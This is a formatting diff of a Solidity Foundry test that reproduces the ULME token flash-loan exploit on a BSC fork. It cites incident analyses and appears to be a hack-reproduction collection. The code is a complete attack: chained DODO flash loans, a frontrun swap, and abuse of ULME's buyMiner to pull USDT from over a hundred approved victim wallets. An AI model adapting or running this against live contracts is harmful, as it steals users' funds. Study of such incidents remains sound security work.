@@ -19,12 +19,8 @@ import {IDVM} from "src/interfaces/IDVM.sol";
 // Beosin: https://twitter.com/BeosinAlert/status/1584888021299916801
 // Neptune Mutual: https://medium.com/neptune-mutual/decoding-ulme-token-flash-loan-attack-56470d261787
 
-IPancakePair constant ULME_BUSD_LPPool = IPancakePair(
-    0xf18e5EC98541D073dAA0864232B9398fa183e0d4
-);
-IPancakeRouter constant pancakeRouter = IPancakeRouter(
-    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
-);
+IPancakePair constant ULME_BUSD_LPPool = IPancakePair(0xf18e5EC98541D073dAA0864232B9398fa183e0d4);
+IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
 IULME constant ULME = IULME(0xAE975a25646E6eB859615d0A147B909c13D31FEd);
 
 // Dodo pairs used only to accumulate BUSD for the frontrun.
@@ -34,6 +30,7 @@ address constant dodo1 = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
 address constant dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
 
 contract Attacker is Test {
+
     IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
 
     uint256 dodo1Balance;
@@ -46,25 +43,15 @@ contract Attacker is Test {
         vm.label(address(ULME), "ULME");
 
         vm.createSelectFork("bsc", 22_476_695);
-        console.log(
-            "-------------------------------- Start Attacker ----------------------------------"
-        );
+        console.log("-------------------------------- Start Attacker ----------------------------------");
     }
 
     function testExploit() external {
         USDT.approve(address(pancakeRouter), type(uint256).max);
         ULME.approve(address(pancakeRouter), type(uint256).max);
 
-        emit log_named_decimal_uint(
-            "[Start] Attacker USDT Balance",
-            USDT.balanceOf(address(this)),
-            18
-        );
-        emit log_named_decimal_uint(
-            "[Start] Attacker ULME Balance",
-            ULME.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[Start] Attacker USDT Balance", USDT.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint("[Start] Attacker ULME Balance", ULME.balanceOf(address(this)), 18);
 
         // addresses attacked by the hacker
         address[] memory victims = new address[](101);
@@ -171,82 +158,42 @@ contract Attacker is Test {
         victims[100] = 0xC2EE820756d4074d887d762Fd8F70c4Fc47Ab47f;
 
         dodo1Balance = USDT.balanceOf(dodo1);
-        emit log_named_decimal_uint(
-            "[before 1st flashloan] borrowing from dodo1",
-            dodo1Balance,
-            USDT.decimals()
-        );
-        IDVM(dodo1).flashLoan(
-            0,
-            dodo1Balance,
-            address(this),
-            abi.encode(victims)
-        );
+        emit log_named_decimal_uint("[before 1st flashloan] borrowing from dodo1", dodo1Balance, USDT.decimals());
+        IDVM(dodo1).flashLoan(0, dodo1Balance, address(this), abi.encode(victims));
 
-        console.log(
-            "-------------------------------- End Exploit ----------------------------------"
-        );
-        emit log_named_decimal_uint(
-            "[End] Attacker USDT Balance",
-            USDT.balanceOf(address(this)),
-            USDT.decimals()
-        );
-        emit log_named_decimal_uint(
-            "[End] Attacker ULME Balance",
-            ULME.balanceOf(address(this)),
-            ULME.decimals()
-        );
+        console.log("-------------------------------- End Exploit ----------------------------------");
+        emit log_named_decimal_uint("[End] Attacker USDT Balance", USDT.balanceOf(address(this)), USDT.decimals());
+        emit log_named_decimal_uint("[End] Attacker ULME Balance", ULME.balanceOf(address(this)), ULME.decimals());
     }
 
-    function DPPFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external {
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         if (msg.sender == dodo1) {
             dodo2Balance = USDT.balanceOf(dodo2);
-            emit log_named_decimal_uint(
-                "[Callback 1] borrowing from dodo2",
-                dodo2Balance,
-                USDT.decimals()
-            );
+            emit log_named_decimal_uint("[Callback 1] borrowing from dodo2", dodo2Balance, USDT.decimals());
             IDVM(dodo2).flashLoan(0, dodo2Balance, address(this), data);
             emit log_named_decimal_uint(
-                "[Callback 1] Attacker USDT Balance after 1st repay",
-                USDT.balanceOf(address(this)),
-                USDT.decimals()
+                "[Callback 1] Attacker USDT Balance after 1st repay", USDT.balanceOf(address(this)), USDT.decimals()
             );
             USDT.transfer(dodo1, dodo1Balance);
             emit log_named_decimal_uint(
-                "[Callback 1] Attacker USDT Balance after 2nd repay",
-                USDT.balanceOf(address(this)),
-                USDT.decimals()
+                "[Callback 1] Attacker USDT Balance after 2nd repay", USDT.balanceOf(address(this)), USDT.decimals()
             );
         }
         if (msg.sender == dodo2) {
             emit log_named_decimal_uint(
-                "[Callback 2] Attacker USDT Balance at start",
-                USDT.balanceOf(address(this)),
-                USDT.decimals()
+                "[Callback 2] Attacker USDT Balance at start", USDT.balanceOf(address(this)), USDT.decimals()
             );
             emit log_named_decimal_uint(
-                "[Callback 2] Attacker ULME Balance at start",
-                ULME.balanceOf(address(this)),
-                ULME.decimals()
+                "[Callback 2] Attacker ULME Balance at start", ULME.balanceOf(address(this)), ULME.decimals()
             );
 
             USDTToULME();
 
             emit log_named_decimal_uint(
-                "[Callback 2] Attacker USDT Balance after frontrun swap",
-                USDT.balanceOf(address(this)),
-                USDT.decimals()
+                "[Callback 2] Attacker USDT Balance after frontrun swap", USDT.balanceOf(address(this)), USDT.decimals()
             );
             emit log_named_decimal_uint(
-                "[Callback 2] Attacker ULME Balance after frontrun swap",
-                ULME.balanceOf(address(this)),
-                ULME.decimals()
+                "[Callback 2] Attacker ULME Balance after frontrun swap", ULME.balanceOf(address(this)), ULME.decimals()
             );
 
             address[] memory victims = abi.decode(data, (address[]));
@@ -254,10 +201,7 @@ contract Attacker is Test {
             uint256 amount = 0;
             for (uint256 i = 0; i < numOfVictims; ++i) {
                 uint256 balance = USDT.balanceOf(address(victims[i]));
-                uint256 allowance = USDT.allowance(
-                    address(victims[i]),
-                    address(ULME)
-                );
+                uint256 allowance = USDT.allowance(address(victims[i]), address(ULME));
                 uint256 take = balance;
                 if (balance > allowance) {
                     take = allowance;
@@ -265,11 +209,7 @@ contract Attacker is Test {
 
                 if (take / 1 ether > 1) {
                     emit log_named_address("mining from", victims[i]);
-                    emit log_named_decimal_uint(
-                        "available for swap",
-                        take,
-                        USDT.decimals()
-                    );
+                    emit log_named_decimal_uint("available for swap", take, USDT.decimals());
                     try ULME.buyMiner(victims[i], (100 * take) / 110 - 1) {
                         amount += take;
                     } catch {
@@ -284,20 +224,14 @@ contract Attacker is Test {
             ULMEToUSDT();
 
             emit log_named_decimal_uint(
-                "[Callback 2] Attacker USDT Balance after backrun",
-                USDT.balanceOf(address(this)),
-                USDT.decimals()
+                "[Callback 2] Attacker USDT Balance after backrun", USDT.balanceOf(address(this)), USDT.decimals()
             );
             emit log_named_decimal_uint(
-                "[Callback 2] Attacker ULME Balance after backrun",
-                ULME.balanceOf(address(this)),
-                ULME.decimals()
+                "[Callback 2] Attacker ULME Balance after backrun", ULME.balanceOf(address(this)), ULME.decimals()
             );
             USDT.transfer(dodo2, dodo2Balance);
             emit log_named_decimal_uint(
-                "[Callback 2] Attacker USDT Balance after 1st repay",
-                USDT.balanceOf(address(this)),
-                USDT.decimals()
+                "[Callback 2] Attacker USDT Balance after 1st repay", USDT.balanceOf(address(this)), USDT.decimals()
             );
         }
     }
@@ -307,11 +241,7 @@ contract Attacker is Test {
         path[0] = address(USDT);
         path[1] = address(ULME);
         pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            USDT.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 
@@ -320,16 +250,15 @@ contract Attacker is Test {
         path[0] = address(ULME);
         path[1] = address(USDT);
         pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            ULME.balanceOf(address(this)) - 1,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            ULME.balanceOf(address(this)) - 1, 0, path, address(this), block.timestamp
         );
     }
+
 }
 
 /* -------------------- Interface -------------------- */
 interface IULME is IERC20 {
+
     function buyMiner(address user, uint256 usdt) external returns (bool);
+
 }
